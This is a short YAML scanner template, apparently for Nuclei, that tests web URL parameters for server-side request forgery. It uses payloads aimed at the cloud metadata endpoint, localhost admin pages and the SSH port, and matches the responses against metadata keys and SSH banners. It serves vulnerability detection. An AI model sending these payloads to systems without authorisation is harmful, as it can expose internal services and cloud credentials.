id: ssrf-basic

info:
  name: Server-Side Request Forgery
  author: moriarty
  severity: high
  description: Detects SSRF vulnerabilities
  tags: ssrf,injection

requests:
  - method: GET
    path:
      - "/?url={{ssrf}}"
      - "/fetch?url={{ssrf}}"
      - "/proxy?url={{ssrf}}"

    payloads:
      ssrf:
        - "http://169.254.169.254/latest/meta-data/"
        - "http://localhost/admin"
        - "http://127.0.0.1:22"
        - "http://[::1]/admin"

    matchers:
      - type: word
        words:
          - "ami-id"
          - "instance-id"
          - "local-hostname"
          - "SSH-"
        condition: or
